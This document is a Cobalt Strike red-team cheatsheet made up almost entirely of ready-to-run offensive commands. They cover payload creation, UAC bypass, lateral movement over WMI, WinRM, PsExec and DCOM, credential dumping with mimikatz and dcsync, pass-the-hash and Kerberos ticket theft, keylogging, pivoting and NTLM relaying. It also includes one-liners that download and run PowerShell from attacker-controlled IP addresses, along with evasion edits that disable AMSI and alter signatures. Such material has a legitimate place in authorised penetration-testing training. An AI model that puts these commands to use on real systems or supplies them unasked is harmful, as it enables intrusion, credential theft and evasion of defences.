# Cobalt-Strike cheatsheet.

#### Start teamserver
```
cd /opt/cobaltstrike
./teamserver <IP> <PASSWORD>
```

#### Create a listener
- Cobalt Strike --> Listeners -->  Click the Add button and a New Listener dialogue will appear.
- Choose a descriptive name such as ```<protocol>-<port>``` example: ```http-80```.
- Set the variables and click Save.

#### Create a payload
- OPSEC: Staged payloads are good if your delivery method limits the amount of data you can send. However, they tend to have more indicators compared to stageless. Given the choice, go stageless.
- OPSEC: The use of 64-bit payloads on 64-bit Operating Systems is preferable to using 32-bit payloads on 64-bit Operating Systems.
- Attacks --> Packages --> Windows Executable (S).

#### Create dll payload
- Bypasses default applocker configuration
```
C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
link <COMPUTERNAME>
```

#### Create peer-to-peer listener
- Creating P2P listeners can be done in the Listeners menu, by selecting the TCP or SMB Beacon payload type.
- Then create payload for the new listener!

#### Connect to beacon
- Works like a bind shell. Most used are SMB or TCP.
- Run the payload on the target
- Connect to the beacon with ```link``` for smb and ```connect``` for tcp.
```
connect <IP> <PORT>
link <IP>
```

#### Create pivot listener
- To start a Pivot Listener on an existing Beacon, right-click it and select Pivoting --> Listener.
- Might need to open port on the firewall

#### Upload and download files
```
upload <FILE>
download <FILE>
```

#### Take screenshots
```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```

#### Keylogger
```
keylogger
```

#### Execute assembly in memory
```
execute-assembly <PATH TO EXE> -group=system
```

#### Load PowerShell script
```
powershell-import <FILE>
```

#### Execute cmd command
```
run <COMMAND>
```

#### Execute powershell command
```
powershell <COMMAND>
```

#### Execute powershell command through powerpick
- Bypasses Constrained Language Mode
```
powerpick $ExecutionContext.SessionState.LanguageMode
```

#### Create service binary
- Used for privilege escalation with services
- Attacks --> Packages --> Windows Executable (S) and selecting the Service Binary output type.
- TIP:  I recommend the use of TCP beacons bound to localhost only with privilege escalations

#### Connect to beacon
```
connect <IP> <PORT>
```

#### UAC bypass method 1
```
elevate uac-token-duplication <LISTENER>
```

#### UAC bypass method 2 runasadmin
```
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
connect localhost 4444
```

- Not all UAC bypasses are created equal, can elevate to system with:

#### Elevate to system
```
elevate svc-exe
```

## Lateral movement
#### Jump
```
jump [method] [target] [listener]

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

#### Remote-exec
```
remote-exec [method] [target] [command]

    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

#### Using credentials
- Each of these strategies are compatible with the various credential and impersonation methods described in the next section, Credentials & User Impersonation. For instance, if you have plaintext 
- credentials of a domain user who is a local administrator on a target, use ```make_token``` and then ```jump``` to use that user's credentials to move laterally to the target.

### PowerShell Remoting
#### Getting the architectur
- for winrm or winrm64 with jump
```
remote-exec winrm <HOSTNAME> (Get-WmiObject Win32_OperatingSystem).OSArchitecture
```

#### Jump winrm smb beacon
```
jump winrm64 <HOSTNAME> smb
```

### PSexec
```
jump psexec64 <HOSTNAME> smb
```

### WMI
```
cd \\<HOSTNAME>\ADMIN$
upload C:\Payloads\beacon-smb.exe
remote-exec wmi <HOSTNAME> C:\Windows\beacon-smb.exe
link <HOSTNAME>
```

### WMI exec commands
```
remote-exec winrm <HOSTNAME> whoami; hostname
```

#### CoInitializeSecurity
- Beacon's internal implementation of WMI uses a Beacon Object File, executed using the beacon_inline_execute Aggressor function. When a BOF is executed the CoInitializeSecurity COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process. The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.
- if CoInitializeSecurity has already been called, WMI fails with access denied.
- As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as spawn and spawnas, or even execute-assembly with a tool such as SharpWMI.

```
remote-exec wmi srv-2 calc
execute-assembly SharpWMI.exe action=exec computername=<HOSTNAME> command="C:\Windows\System32\calc.exe"
```

#### DCOM
- https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
```
powershell Invoke-DCOM -ComputerName <HOSTNAME> -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
```

### Credentials
#### Mimikatz logonpasswords
```
mimikatz sekurlsa::logonpasswords
```

#### Mimikatz ekeys
```
mimikatz sekurlsa::ekeys
```

#### Mimikatz sam
```
mimikatz lsadump::sam
```

#### Make token - runas other user
```
make_token <DOMAIN>\<USER> <PASSWORD>
```

#### rev2self
- Undo the make token
```
rev2self
```

#### Steal token
```
steal_token 3320
steal_token <PID>
````

#### Inject payload into process
```
inject 3320 x64 tcp-4444-local
inject <PID> <ARCH> <BEACON>
```

#### Spawnas
- Will spawn a new process using the plaintext credentials of another user and inject a Beacon payload into it.
- Must be run from a folder the user has access to.
- This command does not require local admin privileges and will also usually fail if run from a SYSTEM Beacon.
```
spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
```

#### Dcsync
```
dcsync
```

#### Pass the hash
```
pth <DOMAIN>\<USER> <NTLM HASH>
```

#### Overpass the hash
- OPSEC: Use AES256 keys
```
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec

#Create new logon session
make_token <DOMAIN>\<USER> DummyPass
[System.IO.File]::WriteAllBytes("C:\Users\public\ticket.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\public\ticket.kirbi

ls \\<HOSTNAME>\c$
```

#### Overpass the hash elevated context
```
execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

#output: [+] ProcessID       : <PID>

steal_token <PID>

ls \\<HOSTNAME>\c$
```

#### Extract tickets
- Extract tickets of a user, create new process, inject ticket into process, steal token from the process
```
execute-assembly Rubeus.exe triage
execute-assembly Rubeus.exe dump /service:krbtgt /luid:<LUID> /nowrap
execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
execute-assembly Rubeus.exe ptt /luid:<LUID> /ticket:[...base64-ticket...]
steal_token <PID>
```

#### Load ticket
```
kerberos_ticket_use <FILE TO TICKET>
```

#### Use ccache file
```
kerberos_ccache_use
```

## Session passing
### Cobalt strike --> Metasploit
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST eth0
set LPORT 8080
exploit -j
```
- Go to Listeners --> Add and set the Payload to Foreign HTTP. Set the Host, the Port to 8080, Set the name to Metasploit and click Save.
```
spawn metasploit
```

### Cobalt strike --> Metasploit shellcode inside process
```
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=8080 -f raw -o /tmp/msf.bin
execute C:\Windows\System32\notepad.exe
ps
shinject <PID> x64 msf.bin
```

### Metasploit --> Cobalt strike
- Go to Attacks --> Packages --> Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.
```
use post/windows/manage/shellcode_inject
set SESSION 1
set SHELLCODE /tmp/beacon.bin
run
```

## Pivoting
### Socksproxy
#### Enable Socksproxy
- OPSEC: This binds 1080 on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone
```
socks <PORT>
```

#### Proxychains
- For linux
```
sudo vim /etc/proxychains.conf
proxychains <COMMAND>
```

#### Proxifier
- https://www.proxifier.com/
- For windows
- Open Proxifier, go to Profile > Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.
- Next, go to Profile > Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).
- Target hosts fill in the target internal network range with the action ```proxy socks <TARGET>```
- NOTE: You will also need to add a static host entry in your C:\Windows\System32\drivers\etc\hosts file: <DC IP> <DOMAIN>. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.

#### Proxychains netonly or overpass the hash
```
runas /netonly /user:<DOMAIN>\<USER> "C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<HASH> /run:"C:\windows\system32\mmc.exe C:\windows\system32\dsa.msc"
```

#### Metasploit
- In Cobalt Strike, go to View > Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. 
- Paste string in msfconsole
- Stop with ```socks stop```

### Manual port forwards
#### Remote port forward netsh
- Requires administrator privs
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=<PORT> connectaddress=<TARGET IP> connectport=<TARGET PORT> protocol=tcp
```

#### List forwards netsh
```
netsh interface portproxy show v4tov4
```

#### Remove port forward netsh
```
netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
```

#### Create port forward rportfwd
- Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.
- Does not require administrator privs
```
rportfwd <PORT> <IP> <PORT>
```

#### Stop port forward rportfwd
```
rportfwd stop <PORT>
```

#### Create port forward rportfwd_local
- Beacon also has a rportfwd_local command.  Whereas rportfwd will tunnel traffic to the Team Server, rportfwd_local will tunnel the traffic to the machine running the Cobalt Strike client.
- Does not require administrator privs
- If 127.0.0.1 doesn't work use teamserver IP
```
rportfwd_local <PORT> <IP> <PORT>
```
    
#### Stop port forward local
```
rportfwd_local stop <PORT>
```

### NTLMRelaying with cobalt strike
- https://github.com/praetorian-inc/PortBender
- Requires administrator privs

#### Place portbender driver on the target
```
cd C:\Windows\system32\drivers
upload C:\Tools\PortBender\WinDivert64.sys
```

#### Load portbender.cna
- Load PortBender.cna from C:\Tools\PortBender this adds a new PortBender command to the console.
```
help PortBender
PortBender redirect 445 8445
```

#### Create port forward
- Create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).
```
rportfwd 8445 127.0.0.1 445
```

#### Create sockx proxy
```
socks 1080
```

#### NTLMRelay execute command
```
proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
```

#### Stop portbender
```
jobs
jobkill <JID>
kill <PID>
```

#### Create link file
```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\<IP>\test.lnk")
$shortcut.IconLocation = "\\<IP>\test.ico"
$shortcut.Save()
```

#### Portscan
```
portscan <CIDR> 139,445,3389,5985 none 1024
```
    
## Evasion
### Artifact-kit
```
vim /opt/cobaltstrike/artifact-kit/src-common/bypass-pipe.c
```

### Changed this part from --> to
```
"%c%c%c%c%c%c%c%c%cMSSE-%d-server"
"%c%c%c%c%c%c%c%c%cService-%d-server"
```

#### Then run build.sh
```
./build.sh
```

#### Download files to W10
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
    
- Make sure C:\tools\cobaltstrike\Artifactkit\dist-pip\artifact.cna is loaded

### Resource-kit
```
notepad C:\tools\cobaltstrike\ResourceKit\template.x64.ps1
```
    
#### Changed all variables in the file from this part --> to
```
for ($x = 0; $x -lt $var_code.Count; $x++) {
  $var_code[$x] = $var_code[$x] -bxor 35
}


for ($i = 0; $i -lt $var_service.Count; $i++) {
	$var_service[$i] = $var_service[$i] -bxor 35
}
```

- Find & Replace for $x -> $i and $var_code -> $var_service.
- Make sure C:\tools\cobaltstrike\Resourcekit\resources.cna is loaded

### Amsi
#### Add the following to the .profile
```
post-ex {
    set amsi_disable "true";
}
```
